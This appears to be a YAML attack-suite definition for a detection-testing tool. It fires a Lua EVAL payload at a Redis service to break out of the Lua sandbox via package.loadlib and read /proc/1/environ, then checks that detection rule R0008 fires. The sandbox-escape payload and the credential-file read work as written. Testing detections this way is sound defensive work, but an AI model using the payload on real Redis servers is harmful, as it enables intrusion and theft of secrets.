apiVersion: bobctl.k8sstormcenter.io/v1alpha1
kind: AttackSuite
metadata:
  name: redis-attack-08-read-proc-environ
  description: "Read /proc/1/environ via sandbox escape. Triggers R0008."
target:
  service: redis
  namespace: redis
  port: 6379
  protocol: redis
attacks:
  - name: read-proc-environ
    type: fileless
    redis:
      eval: |
        local io_mod = nil
        pcall(function()
          if type(io) == 'table' and io.popen then io_mod = io end
        end)
        if not io_mod then
          pcall(function()
            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
            if loader then io_mod = loader() end
          end)
        end
        if not io_mod then return 'sandbox_blocked' end
        local f = io_mod.popen('cat /proc/1/environ 2>/dev/null | tr "\\0" "\\n" | head -3 || echo no_environ')
        local out = f:read('*a')
        f:close()
        return 'environ:' .. out
    successIndicators:
      - responseContains: "environ:"
expectedDetections:
  - attackType: fileless
    ruleID: R0008
    ruleName: "Read Environment Variables from procfs"
    containerName: redis
    command: cat
